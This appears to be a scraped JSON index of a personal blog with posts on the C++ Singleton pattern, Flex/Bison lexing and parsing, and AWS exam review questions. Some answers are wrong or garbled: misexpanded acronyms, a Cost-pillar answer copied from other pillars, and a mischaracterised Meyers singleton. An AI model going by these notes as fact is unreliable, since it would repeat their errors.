pInst = nullptr; T* GetInstance() { if (nullptr == pInst) { lock(); if (nullptr == pInst) { pInst = new T; } unlock(); } return pInst; }   if (nulptr == pInst) 中的if 确保仅在 pInst 是空指针的情况下才去获取锁并尝试构造对象； if (nullptr == pInst) 的 if 则是为了防止这样一种可能，避免重复操作和内存泄露：在外层 if 检测是，pInst 尚为空，但是，待 lock() 执行完毕后，别的线程已经为 pInst 赋值。  这段代码，乍一看是没有问题的；但仍需小心揣摩。我们看 pInst = new T; 这一行代码，它基本完成了三件事情\n 为 T 类型的对象分配内存； 在这片内存上执行 T 的构造函数； 将这片内存的起始地址赋值给 pInst。  由于构造函数的执行和指针的赋值是互不依赖的，所以 CPU 可能会交换这两个步骤的顺序。因此，在线程执行的过程中，可能存在这样一种情况：nullptr != pInst，但是它指向的对象尚未构造成功。于是，如果在这一时刻，当前线程被中断，并且其它线程调用 GetInstance 函数，那么函数在外层 if 执行之后，会直接返回 pInst 的值。而此时 pInst 实际上指向的是一片尚未初始化的内存。如果线程代码对 pInst 进行访问，那么程序很有可能就会崩溃。\n为了解决这类 CPU 动态调度导致的问题，我们需要有在某些情况下阻止指令换序执行的能力。然而遗憾的是，由于动态调度是 CPU 的功能，所以在高级语言的层次，我们没有通用的解决办法——只能依赖具体的 CPU 架构，对代码进行调整。对于 i386 架构的 CPU 来说，它提供了一条指令 mfence（memory fence 的缩写），可以阻止这种换序执行。\n#define barrier() __asm__ volatile(\u0026quot;mfence\u0026quot;) volatile T* pInst = nullptr; T* GetInstance() { if (nullptr == pInst) { lock(); if (nullptr == pInst) { T* temp = new T; barrier(); pInst = temp; } unlock(); } return pInst; }  用 barrier() 保证了在 pInst 被赋值之前，相关内存区域已经正确地初始化了。\nMeyers单例模式实现 #include \u0026lt;cstdlib\u0026gt; // for rand() #include \u0026lt;iostream\u0026gt; class Random { public: static Random\u0026amp; getInstance(); int operator()(int a, int b) const { return (rand() % b) + a; } private: Random(const Random\u0026amp;); Random\u0026amp; operator=(const Random\u0026amp;); Random() { int seed = time(0); srand(seed); } }; Random\u0026amp; Random::getInstance() { static Random instance; return instance; } int main() { Random\u0026amp; random = Random::getInstance(); std::cout \u0026lt;\u0026lt; random(1,100) \u0026lt;\u0026lt; std::endl; }  第二种实现方式和之前一种实现方式的区别在： 第一种\n 懒汉模式申明了一个静态对象，在用户第一次调用时初始化，虽然节约了资源，但第一次加载时需要实例化，反映稍慢一些，而且在多线程不能正常工作。  //First one Random* Random::getInstance() { if ( !instance ) instance = new Random; return instance; } Random* Random::instance = NULL; //Define the static instance variable somewherr  第二种：\n 在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快。 这种方式基于类加载机制避免了多线程的同步问题，但是也不能确定有其他的方式（或者其他的静态方法）导致类装载，这时候初始化instance显然没有达到懒加载的效果。  //Second One Random\u0026amp; Random::getInstance() { static Random instance; return instance; }  推荐阅读： 设计模式（二）单例模式的七种写法\n","date":1538665771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538665771,"objectID":"6fe0315a7dbe20f866c29554abd3ba37","permalink":"http://www.guozet.me/post/C++Singleton-pattern/","publishdate":"2018-10-04T15:09:31Z","relpermalink":"/post/C++Singleton-pattern/","section":"post","summary":"什么是Singleton? 单例模式（Singleton），保证一个类仅有一个实例，并提供一个访问它的全局访问点。\n 可以考虑在下面的一些场景中应用：\n Windows的Task Manager（任务管理器）就是很典型的单例模式（这个很熟悉吧），想想看，是不是呢，你能打开两个windows task manager吗？ 不信你自己试试看哦~  windows的Recycle Bin（回收站）也是典型的单例应用。在整个系统运行过程中，回收站一直维护着仅有的一个实例。 网站的计数器，一般也是采用单例模式实现，否则难以同步。 应用程序的日志应用，一般都何用单例模式实现，这一般是由于共享的日志文件一直处于打开状态，因为只能有一个实例去操作，否则内容不好追加。 Web应用的配置对象的读取，一般也应用单例模式，这个是由于配置文件是共享的资源。 在数据库连接池的设计一般也是采用单例模式，因为数据库连接是一种数据库资源。数据库软件系统中使用数据库连接池，主要是节省打开或者关闭数据库连接所引起的效率损耗，这种效率上的损耗还是非常昂贵的，因为何用单例模式来维护，就可以大大降低这种损耗。 多线程的线程池的设计一般也是采用单例模式，这是由于线程池要方便对池中的线程进行控制。 操作系统的文件系统，也是大的单例模式实现的具体例子，一个操作系统只能有一个文件系统 上述内容来自于： 单例模式的常见应用场景   单例模式应用的场景一般发现在以下条件下：\n 资源共享的情况下，避免由于资源操作时导致的性能或损耗等。如上述中的日志文件，应用配置 控制资源的情况下，方便资源之间的互相通信。如线程池等。 ","tags":"C++","title":"C++软件设计模式之Singleton","type":"post"},{"authors":null,"categories":"Cloud computing","content":"Exam_2 Review Questions. Approximately 60% of the exam will be derived from these questions.\n  True or False: Users should store dynamic web content in S3.\n  What advantage is there in storing static web content in S3? S3 is reliable, and durable. S3 is simple to ensure static web content is quickly accessible, always available, and secure.\n  Name four AWS constructs that allow you to control your VPC traffic. Internet gateway, route tables, security group, network access control lists.\n  True or False: Security groups are stateless and Network ACLs are stateful. Explain what this means. Security group: Return traffic is automatically allowed, regardless of any rules. ACLs: Return traffic must be explicitly allowed by rules.\n  What is the purpose of an Internet Gateway? Is this a managed AWS service? Yes, it’s a managed AWS service. An Internet gateway serves two purposes: to provide a target in your VPC route tables for Internet-routable traffic, and to perform network address translation (NAT) for instances that have been assigned public IPv4 addresses.\n  Describe the main difference between a public and a private subnet. The main difference is the route for 0.0.0.0/0 in the associated route table. A private subnet sets that route to a NAT instance. Private subnet instances only need a private IP and internet traffic is routed through the NAT in the public subnet. You could also have no route to 0.0.0.0/0 to make it a truly private subnet with no internet access in or out. A public subnet routes 0.0.0.0/0 through an Internet Gateway (igw). Instances in a public subnet require public IPs to talk to the internet.\n  Expand each of the following acronyms of the following in the context of this class and provide a short description of what each is:\n RTO Recovery Time Objective, how quickly the system can recover? RPO Recovery Point Objective, how much data can you afford to lose? HA High Availability DNS Domain Name System JSON JavaScript Object Notation SOA Service Oriented Architecturegh     What is the difference about On-Premises HA Vs HA on AWS\n On-Promises HA: 1. very expensive; 2. It\u0026rsquo;s suitable only for mission-critical(派遣确定的) applications. HA on AWS: 1.Multiple services. 2.Isolated redundancy data centers within each availability zone. 3.multiple availability zones within each region. 4. Region across the global. 5.Fault-tolerance service.    From 100-CCA-31-EN-U3SG.pdf Module 3.\n  List the three main factors associated with High Availability.\n Fault tolerance: the built-in redundancy of an application’s component(组件). Recoverability: the process, policies, and procedures related to restoring service after a catastrophic(灾难性的) event. Scalability: the ability of application to accommodate growth without changing design.    What does enabling connection draining on an ELB do? Why is this important? This enables the load balancer to complete in-flight requests made to instances that are de-registering or unhealthy. To ensure that a Classic Load Balancer stops sending requests to instances that are de-registering or unhealthy, while keeping the existing connections open.\n  True or False: Amazon CloudWatch allows the user to create custom metrics for their specific application.\n  What are three types of capacity parameters that an Auto Scaling Group defines? Desired, minimum,maximum\n  Define a sample Auto Scale Policy. The scaling policies that you define adjust the number of instances, within your minimum and maximum number of instances, based on the criteria that you specify.\n  True or False: When using Auto Scaling, you should be more cautious scaling in and try to avoid aggressive instance termination.\n  What are three languages AWS Lambda currently supports? Python, JavaScript, java, c#\n  What AWS Service can be classified as Infrastructure as Code? AWS CloudFormation\n  Define AWS CloudFormation. AWS CloudFormation is a service that can be classified as infrastructure as code.\n  List seven possible sections that can be included in a AWS CloudFormation Template. Description, metadata, parameters, mappings, conditions, transform, resources.\n  True or False: The more loosely your system is coupled the more easily it scales.\n  Define Services in the context of a SOA. Services are self-contained units of functionality.\n  Define a Microservice and give an example. Microservice: Small, independent processes within an SOA. Each process is focused on doing one small task. Processes communicate to each other using language-agnostic APIs. Example: SNS? Use application load balancer with EC2 container service and auto scaling to implement mircoservice application.\n  What AWS Service provides a fully managed message queueing service? SQS: Amazon Simple Queue Service is a fully managed message queueing service. Transmit any volume of messages at any level of throughput without losing messages or requiring other services to be always available.\n  What is a dead letter queue? A dead letter queue is a queue of messages that could not be processed.\n  List three Amazon SQS use cases.\n Work Queues: Decouple components of a distributed application that may not all process the same amount of work simultaneously. Buffering Batch Operations: Add scalability and reliability to your architecture and smooth out temporary volume spikes without losing messages or increasing latency. Request Offloading: Move slow operations off of interactive request paths by enqueueing the request. Fan-out: Combine Amazon SQS with Amazon SNS to send identical copies of a message to multiple queues in parallel for simultaneous processing. Auto Scaling: Use Amazon SQS queues to help determine the load on an application, and when combined with Auto Scaling, you can scale the number of Amazon EC2 instances out or in, depending on the volume of traffic.    List three subscriber types allowed by Amazon SNS.\n Email(plain or JSON) HTTP/HTTPS Short Message Service(SMS) clients(USA only) Amazon SQS queues Mobile push messaging AWS lambda function    List the characteristics of Amazon SNS. Single published message, Order is not guaranteed, No recall, HTTP/HTTPS retry, 256 KB max per message\n  True or False: Amazon Kinesis is a database solution. False? Amazon Kinesis makes it easy to collect, process, and analyze real-time, streaming data so you can get timely insights and react quickly to new information.\n  Amazon S3 provides read-after-write consistency for PUTS of new objects and provides eventual consistency for overwrites of PUTS and DELETES.\n  Define eventual consistency. Define read-after-write consistency. (no specific definition) Eventual consistency is a consistency model used in distributed computing to achieve high availability that informally guarantees that, if no new updates are made to a given data item, eventually all accesses to that item will return the last updated value. Read-after-write consistency is similar to a strongly consistent read returns a result that reflects all writes that received a successful response prior to the read.\n  Fill in the chart below:\n     Null Amazon SNS Amazon SQS     Manage Persistence No Yes   Delivery Mechanism Push(Passive) Poll(Active)   Producer/Consumer Publish(subscriber) Send(receive)     AWS Lambda starts code within milliseconds of an event.\n  List four triggers currently supported by AWS Lambda.\n Amazon DynamoDB S3 SNS CloudWatch    How many different levels of resource allocation does AWS Lambda provide? What is the range of memory provided? What is the maximum runtime of a AWS Lambda function?\n 23 different levels 128M-1.5G 5 minutes    True or False: Amazon CloudFront is located within AWS Edge Locations.\n  List three ways to expire contents within Amazon CloudFront.\n Time to live (TTL) Change Object Name Invalidate Object    List the four pillars of the AWS Well-Architected Framework.\n Security pillar Reliability pillar Performance pillar Cost pillar    Describe three principles of the Security pillar.\n Apply security at all layer: instead of just running security appliances at edge of your infrastructure, use firewalls and other security control on all of your resources. Enable traceability: Log and audit all action and changes to your environment and access to yourservice Automate response for security events: monitor and automatically trigger response to event-driven or condition driven alters    Describe three principles of the Reliability pillar.\n Test recovery procedures: in cloud, you can test how your system fail, and you can validate your recovery procedures. Automatically recover from failure: by monitoring a system for key performance indicators(KPIs), you can trigger automation when a threshold is breached. Scaling horizontally to increase aggregate system reliability: replace one large sources with multiple small sources to reduce the impact of single failure on the overall system.    Describe three principles of the Performance pillar.\n Use advanced technologies: such as edge location or edge service, can reduce latency for service and load on your system. Use “serverless” Architecture: serverless architectures remove the need for you to run and maintain servers to carry out traditional compute activities. Go global in minutes: easily deploy your system in multiple regions around the world with just few clicks.    Describe three principles of the Cost pillar.   Test recovery procedures: in cloud, you can test how your system fail, and you can validate your recovery procedures.\n  Automatically recover from failure: by monitoring a system for key performance indicators(KPIs), you can trigger automation when a threshold is breached.\n  Scaling horizontally to increase aggregate system reliability: replace one large sources with multiple small sources to reduce the impact of single failure on the overall system.\n  Describe three principles of the Performance pillar.\n  Use advanced technologies: such as edge location or edge service, can reduce latency for service and load on your system.\n  Use “serverless” Architecture: serverless architectures remove the need for you to run and maintain servers to carry out traditional compute activities.\n  Go global in minutes: easily deploy your system in multiple regions around the world with just few clicks.\n  What are three things might you troubleshoot if your instance times out?\n check your routes check your security group rules check your network ACLs    What are three things might you troubleshoot if your network is unreachable?\n Check your routes Check your security group rules Check your Network ACLs    What are three things might you troubleshoot if the CPU load on your database is too high?\n Optimize your queries Use read replicas Ensure your are using the best instance type    What are three things might you troubleshoot if your access is denied?\n Verify you have permission to call that action on that resource verify that any resource policies specify you as a principal and grant you access    Describe five tradeoffs, in a table, of Instance Store, EBS, S3, and Glacier.   Describe five tradeoffs, in a table, of DynamoDB, RDS, and Redshift.   List five EC2 Purchasing Options\n On-demand instances Spot instances Reserved instances Dedicated instances Dedicated hosts    Spot instances are provided a termination notice 24 times? prior to termination (i.e., how much time?)\n  List and describe the differences of three different payment models for EC2 Reserved Instances.\n All upfront: pay for the entire Reserved Instance with one upfront payment. Partial Upfront: make a low upfront payment, and then you are charged a discounted hourly rate for the instance for the duration of the Reserved Instance term No Upfront: Does not require any upfront payments and provides a discounted hourly rate for the duration of the term.    All upfront: pay for the entire Reserved Instance with one upfront payment.\n  Partial Upfront: make a low upfront payment, and then you are charged a discounted hourly rate for the instance for the duration of the Reserved Instance term\n  No Upfront: Does not require any upfront payments and provides a discounted hourly rate for the duration of the term.\n  Describe the difference between a Dedicated Instance and a Dedicated Host.\n Dedicated Instances - You pay for the instances, but they get placed on whatever dedicated hardware Amazon decides. Dedicated Host - You pay for the entire physical server and can, in effect, run instances on it as you please. A Dedicated Host and a dedicated instance is that a Dedicated Host gives you additional visibility and control over how instances are placed on a physical server, and you can consistently deploy your instances to the same physical server over time. As a result, Dedicated Hosts enable you to use your existing server-bound software licenses and address corporate compliance and regulatory requirements.    Describe one advantage of each of the following High Availability Patterns (may not get to this one)\n Job Observer Scheduled Scale-Out Multi-AZ High Availability Database Floating IP Floating Interface State Sharing    ","date":1538665771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538665771,"objectID":"c0b37ea2deb373dcebc2d7826f032546","permalink":"http://www.guozet.me/post/CPSC6440-CloudComputing-basic-concepts2/","publishdate":"2018-10-04T15:09:31Z","relpermalink":"/post/CPSC6440-CloudComputing-basic-concepts2/","section":"post","summary":"Exam_2 Review Questions. Approximately 60% of the exam will be derived from these questions. True or False: Users should store dynamic web content in S3. What advantage is there in","tags":"Cloud computing","title":"Cloud computing Basic concepts 2","type":"post"},{"authors":null,"categories":"Flex","content":"Flex介绍 Flex和Bison都是用来生成程序的工具。编译器的工作主要可以分解成两个方面：词法分析与语法分析\n 词法分析(lexical analysis 或Scanning): 将输入分割成一个个有意义的词块，称之为记号token 语法分析(syntax analysis 或prsing): 这是确定这些记号是如何彼此关联的。  一个小的例子：\nalpha = beta + gamma;  词法分析器是将这些代码分解成一些token: alpha, 等号， beta, 加号， gamma和分号。接下来语法分析器就需要确定beta + gamma是一个表达式，而这个表达式被赋值给了alpha。\nFlex例子 第一个简单的Flex例子 我们使用flex来实现一个文件的行数，单词数和字符数统计程序。包含两个文件main.cpp以及flex语言的scan.l。\nFlex部分的程序代码 首先介绍scan.l程序，介绍程序之前我们需要先了解一些flex的语法。Flex的程序主要包含三个部分，各个部分之间使用仅有的%%来进行分隔。\n 第一部分：包含声明和选项设置 第二部分：包含一些力的模式和动作 第三部分：这部分是C代码，会被拷贝到生成的词法分析器（对应代码是由scan.l文件转换得到的lex.yy.c）里面的最后的位置。  %{ #include \u0026lt;iostream\u0026gt; int lines = 0; int words = 0; int chars = 0; %} word [a-zA-Z]+ %% {word} { ++words; chars += strlen(yytext); } \u0026quot;\\n\u0026quot; { ++lines; ++chars; } . { chars += strlen(yytext); } %% int yywrap() { return 1; }  在第一部分的%{ }%之间代码会被拷贝到C文件lex.yy.c文件的开头部分。\n第二部分，每个模式在第一行的开头位置，而后面是模式匹配时所需要执行程度C代码。这里的C代码就是{和}之间的一行或者多行代码。\n 模式必须在行首出现，因为Flex会把空白开始的行都是代码而把它们复制到生成的c程序中\n 说明. { chars += strlen(yytext); }这个位置使用了一个变量yytext,这边变量总是被设置为指向本次匹配的输入文本。\n第三部分的代码，是直接拷贝到lex.yy.c文件的最后一部分的:\n接下来编译这个文件,编译的时候，使用flex对应的库文件-lfl进行链接。\nflex scan.l gcc lex.yy.c -lfl  Main函数实现最后的打印功能 在Main()函数里面，我们调用flex提供的词法分析例程yylex(),\n#include \u0026lt;iostream\u0026gt; int yylex(); extern int words; extern int lines; extern int chars; int main() { yylex(); std::cout \u0026lt;\u0026lt; \u0026quot;words: \u0026quot; \u0026lt;\u0026lt; words \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;lines: \u0026quot; \u0026lt;\u0026lt; lines \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;chars: \u0026quot; \u0026lt;\u0026lt; chars \u0026lt;\u0026lt; std::endl; return 0; }  运行结果，使用wc命令进行对比判断：\n在这里我们为了方便可以使用Markfile来进行编译的管理，Makefile文件如下：\nCCC = g++ LEX = flex CFLAGS = -Wall LEXFLAGS = -Wno-unused OBJS = main.o lex.yy.o run: $(OBJS) $(CCC) $(CFLAGS) -o run $(OBJS) main.o: main.cpp $(CCC) $(CFLAGS) -c main.cpp lex.yy.c: scan.l $(LEX) scan.l lex.yy.o: lex.yy.c $(CCC) $(CFLAGS) $(LEXFLAGS) -c lex.yy.c clean: rm -f run *.o lex.yy.c  这个例子的官方实现情况 scan.l文件：\n%{ /* TERMINOLOGY: A \u0026quot;word\u0026quot; is a set of non-delimiters seperated by delimiters. * -- edge case 1: files with a word and no delimiters * -- edge case 2: last word of the file * -- edge case 3: leading delimiters * -- edge case 4: files with only delimiters * * A \u0026quot;line\u0026quot; is a newline character \\n. * -- Weirdly, a file written on one line with no newline * character at the end is considered to have ZERO lines * * A \u0026quot;char\u0026quot; is ANY character in the file (delimiters and non-delimiters). */ #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; int words = 0; // count of words int chars = 0; // count of chars int lines = 0; // count of lines %} %option noinput %option nounput /* definition of characters that DO NOT compose words * ~ spaces, tabs, and newlines */ delimiter [ \\t\\n] /* definition of characters that DO compose words * ~ everything but spaces, stabs, and newlines */ letter [^ \\t\\n] %% /* This rule is for the edge-case that delimiters appear * at the front of the file or the file has only delimiters. */ {delimiter}+ { chars += strlen(yytext); for(int i = 0; yytext[i]; ++i) if(yytext[i] == '\\n') ++lines; } /* This rule is for typical cases, files with one word * and no delimiters, and the last word of the file. * * Note that we use the closure set of delimiters, not the * the positive closure set. What would happen if we made this change? */ {letter}+{delimiter}* { ++words; chars += strlen(yytext); for(int i = 0; yytext[i]; ++i) if(yytext[i] == '\\n') ++lines; } %% int yywrap() { return 1; }  main.cc文件：\n#include \u0026lt;iostream\u0026gt; int yylex(); extern int words; extern int lines; extern int chars; int main() { yylex(); std::cout \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026quot;~~~~~~~~~~\u0026quot; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;lines: \u0026quot; \u0026lt;\u0026lt; lines \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;words: \u0026quot; \u0026lt;\u0026lt; words \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;characters: \u0026quot; \u0026lt;\u0026lt; chars \u0026lt;\u0026lt; std::endl; return 0; }  输出结果对比：\n 使用Flex和Bison协同工作\u0026mdash;计算器 语法分析器是找出输入记号之间的关系，最常见的关系就是语法分析树(parser tree)\nScan.l文件协同工作原理分析 scan.l文件，在处理用户输入的数学方程式的时候，我们为了处理简单，这里只考虑识别整数，基本算术运算符。\n 词法分析器与语法分析器协同工作 使用词法分析器获得一个记号流，然后将这个记号流传递给其他程序，每当产生一个记号之后，就调用yylex()来读取当前匹配到的输入然后返回去相应的记号。当程序需要下一个记号的会后，需要再次调用yylex(). 注明：词法分析器以协同程序的方式进行运行，每次它返回的手，就会记住当前处理的位置，并从这个位置开始去处理下一次的调用。 如果这次匹配不需要产生记号，那么词法分析器就会在这次yylex()调用中继续分析接下来的输入字符。\n 特点：如果动作有返回，那么词法分析器就会在下一次yylex()调用中继续；如果动作没有返回，词法分析器就会立即继续进行。\n%{ #include \u0026quot;parse.tab.h\u0026quot; %} %% \u0026quot;+\u0026quot; { return PLUS; } \u0026quot;-\u0026quot; { return MINUS; } \u0026quot;*\u0026quot; { return MULT; } \u0026quot;/\u0026quot; { return DIV; } [0-9]+ { return NUMBER; } \u0026quot;\\n\u0026quot; { return CR; } \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt; { yyterminate(); } %% int yywrap() { yylex_destroy(); return 1; }  在这个程序中，我们可以看到出现的记号为：PLUS, MINUS, MULT, DIV, NUMBER, CR, EOF,这些记号是在parse.tab.h这个文件中生成的，而这个文件是根据parser.y的bison文件生成出来的。这些记号是对应了一个记号编号和记号值的。记号编号是一个较小的整数，随机生成的，但是0意味的是文件的结束。\n如果我们想完全在flex里面实现输出，那么也可以使用enum来定义记号数值编号。\nBison部分工作 Bison的程序包含了与Flex程序相同的三部分结构：声明部分，规则部分和C代码部分。\n 声明部分：包含了会被原样拷贝到目标分析程序开头的C代码，通过%{ 和 }%来声明，之后是%token记号声明，用于告诉bison在语法分析器里面记号的名称。 (潜规则：记号使用大写字母)在第二部分中，任何没有在这里声明为记号的语法符号必须出现在至少一条规则的左边 第二部分，通过简单的BNF定义的规则。 Bison使用 :来分割，使用;来表示规则的结束。如果有C代码，那就需要在两个{ 与}之间。  %{ #include \u0026lt;iostream\u0026gt; extern int yylex(); extern int yylval; void yyerror(const char * msg); %} %token CR NUMBER PLUS MINUS MULT DIV %% lines : lines expr CR { std::cout \u0026lt;\u0026lt; \u0026quot;result: \u0026quot; \u0026lt;\u0026lt; $2 \u0026lt;\u0026lt; std::endl; } | lines CR | ; expr : expr PLUS term { $$ = $1 + $3; } | expr MINUS term { $$ = $1 - $3; } | term { $$ = $1; } ; term : term MULT factor { $$ = $1 * $3; } | term DIV factor { $$ = $1 / $3; } | factor { $$ = $1; } ; factor : NUMBER ; %% void yyerror(const char * msg) { std::cout \u0026lt;\u0026lt; msg \u0026lt;\u0026lt; std::endl; }  #include \u0026lt;iostream\u0026gt; extern int yyparse(); int main() { if ( yyparse() ) { std::cout \u0026lt;\u0026lt; \u0026quot;syntactically correct program\u0026quot; \u0026lt;\u0026lt; std::endl; } return 0; }  ","date":1537826971,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537826971,"objectID":"b4e26c51e32f0096c043a04d3c2a397f","permalink":"http://www.guozet.me/post/Flex-And-Bison-Introduce/","publishdate":"2018-09-24T22:09:31Z","relpermalink":"/post/Flex-And-Bison-Introduce/","section":"post","summary":"Flex介绍 Flex和Bison都是用来生成程序的工具。编译","tags":"Flex","title":"Flex与Bison基础概念介绍","type":"post"},{"authors":null,"categories":"Cloud computing","content":"Exam 1 Review Questions. Exam 1 will be derived from these questions.\n注明：加粗的问题是考试的重点考试题目\nAcronyms Expand each of the following acronyms of the following in the context of this class:\n AWS: Amazon Web Services AZ: Availablity Zone EC2: Elastic Compute Cloud S3: Sample Storage Service EBS: Elastic Block Store RDS: Relation Database Service NoSQL: No-relation SQL ELB: Elastic Load Balancing PAAS: Platform as a service HAAS: Hardware as a service IAAS: Infrastructure as a service SAAS: Software as a service CIDR: Classless inter-domain routing REST: Representational State Transfer SOAP: Simple Object Access Protocol VPC: Virtual Private Cloud CTO: Chief Technology Officer CIO: Chief Information Officer AMI: Amazon Machine Image IAM: Identity and Access Management MFA: Multi-factor Authentication IOPS: I/O Operations per second ACL: Access Control List CLI: Command Line Interface SDK: Software Development Kit API: Application Interface JSON: JavaScript Object Notation   General Questions\n Define cloud computing.  Cloud computing is the on-demand delivery of compute power, database storage, applications, and other IT resources through a cloud services platform via the internet, with pay-as-you-go pricing. Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g. networks, servers, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction.\n Name and briefly describe six advantages and benefits of using commercial cloud computing.\n No upfront investment, users just click to order resources and can be immediate access and pay for the resources you need, which are available almost immediately. Low on-going costs, AWS is continually lower prices and can optimize cost with prices option Focus on innovation, users just need to focus on application development and do not care of other operations Flexible capacity, you just provision the resources you need Speed and agility, AWS is fast and on-demand provisioning. makes it possible for you to respond to changing market conditions. Global reach on demand, users can deploy any AWS region on-demand and lower latency to distributed users bases.  Second\n Trade Capital Expense for Variable Expense Benefit from massive economies of scale. Stop guessing about capacity. Increase speed and agility. Stop spending money running and maintaining data centers. Go global in minutes.    What are the two cloud deployment models? All-in Cloud, Hybrid Cloud, Private Cloud(On-premises). Public Cloud, Private Cloud, Community Cloud and Hybrid Cloud.\n  Explain the difference between a hybrid cloud deployment model and an All-In cloud deployment model.\n All-In\u0026rdquo; Cloud is a cloud-based application that is fully deployed in the cloud, and all parts of the application run in the cloud. A hybrid deployment is a way to connect infrastructure and applications between cloud-based resources and existing resources that are not located in the cloud.    When was the AWS cloud first made available as a product? 2004\n  Name three other commercial clouds in addition to AWS. Google Engine, Mircosoft Azure, Sun Cloud.\n  True or False: Deploying your enterprise applications in the AWS cloud is cheaper than running your own data center. Explain your answer. True. If you running your applications in your own data center, the first thing is you must build a data center, you need to build the basic infrastructure(Power system, engine room etc.) and you need to buy lots of servers and network devices. Moreover, you must employ people to help you to maintain and manage the datacenter. But, for AWS, you just pay for the resource that you truly want and there are lots of purchases options to use AWS service.\n  Describe three advantages and one disadvantage of running enterprise applications in the commercial cloud as compared to running your own data center.\n Advantages: Cheaper, scalable, no labor maintain Disadvantage: Risk of AWS service down     AWS Computing\n  What is the AWS Marketplace? AWS Marketplace is an online store where you can buy or sell software that runs on Amazon Web Services.\n  What is a hypervisor and what is its main function? Do you have access to the hypervisor layer in AWS? Explain your answer.\n A hypervisor is a function which abstracts and isolates operating systems and applications from the underlying computer hardware. This abstraction allows the underlying host machine hardware to independently operate one or more virtual machines as guests, allowing multiple guest VMs to effectively share the system\u0026rsquo;s physical compute resources, such as processor cycles, memory space, network bandwidth and so on. The main function of hypervisor is to manage the virtual machines. No, you don’t need to access the hypervisor layer, you just need to use EC2 instance to develop your own application, and AWS will help you to manage the resource that your virtual machines needed.    What is an Instance?\n  Amazon instances are virtualized servers or virtual computing environments in amazon’s data centers.\n Draw the EC2 instance life cycle diagram. See here (Links to an external site.)Links to an external site.   Explain what “Pay as you Go” means. “Pay as you Go” means you just pay for the resources that you truly used, and if you do not use those resources, you do not need to pay. Like electric power or water, when you use it, then you pay for it.\n  List four AWS EC2 Purchasing Options. On-demand instance, Reserved instance, Spot instance, Dedicated Hosts. Scheduled instance, Dedicated instance,\n  Describe at least three differences between On-Demand purchasing and Reserved Instance purchasing. (Between On-Demand purchasing and Spot Instance purchasing, between Reserved purchasing and Scheduled purchasing.)\n On-Demand Instances: 1. Computer capacity by the hours \u0026amp; second. 2. It has short-term, spiky o unprecdictable workload. Low cost and flexibility. Reserved Instance: 1. Purchasing need upfront payment, steady-state workload, can get 50%-75% lower than on-demand rate. 2. Overall cost is lower. 3. Predictability ensures compute capacity is available when needed. Spot Instances: 1.Bid for unused Amazon EC2 capacity. 2.The price based on supply and demand. 3.Instances can be lost if you’re outbid, 4. Instances can be interrupted if the Spot price exceeds the maximum. 5.Large scale, dynamic workload. Dedicated Hosts: 1.Save money on licensing costs. 2.Help meet compliance and regulatory requirements.    For what kind of workload would you prefer on-Demand pricing? Spot pricing? Reserved Instance pricing? Scheduled Instance pricing?\n On-demand: short term, spiky or unpredicted workload; Reserved: consistent, heavy workload. Steady state or preictable usage workloads. Spot: Applications with flexible start and end times. Scheduled: Usage and licensing tracking.    True or False: If you launch an instance using Spot pricing and it is terminated by AWS in 30 minutes then you are charged for the full hour.\n  False. The minimum is 60 seconds. But it are billed on one-second increments.\n  True or False: If you launch an instance using Spot pricing and you terminate it in 30 seconds then you are charged for the full minute. True. The minimum of 60 second.\n  True or False: An AMI includes a template for the root volume, launch permission that control which AWS accounts can use the AMI, and a block device mapping that specifies the volumes to attach to the instance when it is launched. True\n  Name four families of EC2 instances.\n General purpouse: t2, m3, m4 Compute-Optimized: c4,c3 Mermory-Optimized: r3 GPU instance: g2    What is Instance Metadata? Give an example.\n  Instance Metadata is data about the instance, can be used to configure and manage a running instance. For example, aim-id, ami-launch-index, private or public IP address etc.\nWhat is Instance User Data? Give an example.  Instance User data is a data can be passed to the instance at launch and can be used to perform common automated configuration scripts. For example:\n#!/bin/bash yum update -y yum install -y httpd24 php56 mysql55-server php56-mysqlnd service httpd start chkconfig httpd on  Explain the concept of bootstrapping an instance.  It creates an application context that provides the runtime context for an application.\nTrue or False: You are able to reboot any type of instance. True   AWS Storage\n  Describe three differences between Amazon EBS and Amazon EC2 Instance Store\n EBS: Data stored in EBS can persist independently of the life of instance. Storage is persistent. Used to store higher level durable data.which can be mounted as a device to an Amazon EC2 instance. Mountable storage, Amazon EBS can only be mounted to an Amazon EC2 instance within the same Availability Zone. EC2 Instance Store: Data stored in EC2 Instance Store can persist only as long as the instance alive. Storage is ephemeral. Used to store temporary data.    True or False: Every type of instance can use EC2 Instance Store. Explain your answer. (This is a trick question). False: Use the local instance store only for temporary data.\n  What is the difference between ephemeral and persistent storage? Which type is EBS? Which type is S2? Which type is Instance Store?\n Persistent storage is just like a data is stored in hard disk, and will persist in this disk. The Ephemeral storage means the stored data always a temporary data, like cache, buffers etc. When the instance is unlived, this data will be deleted. EBS: persistent storage, S3: persistent storage , Instance Store: ephemeral storag    Describe the difference between Block Storage and Object Storage. Describe what happens if you change a single character in Block Storage versus what happens if you change a single character in Object Storage.\n Block Storage: File is split and stored in fixed sized blocks; Capacity can be increased by adding more nodes; Suitable for applications which require high IOPS, database, transactional data. Object Storage: Store virtually unlimited files; Maintain file revisions; HTTP(S) based interface; Files are distributed in different physical nodes.(from Google) This means that you must write whole objects at a time. If you change one small part of a file, you must rewrite the entire file in order to commit the change to Amazon S3.(U2page77)    True or false: S3 is a Block Storage system. False. S3 is cloud object storage for the Internet where files are reachable via a restful URL.\n  True or false: EBS is an Object Storage system. False. EBS provides block-level storage volumes for use with Amazon EC2 instances.\n  True or false: S3 is a key-value object store with unlimited storage capacity. Explain your answer. True False: An object is composed of a file and any metadata that describes that file. S3 can store an unlimited number of objects in a bucket. There is a 100-bucket limit per account and the size of an object can be up 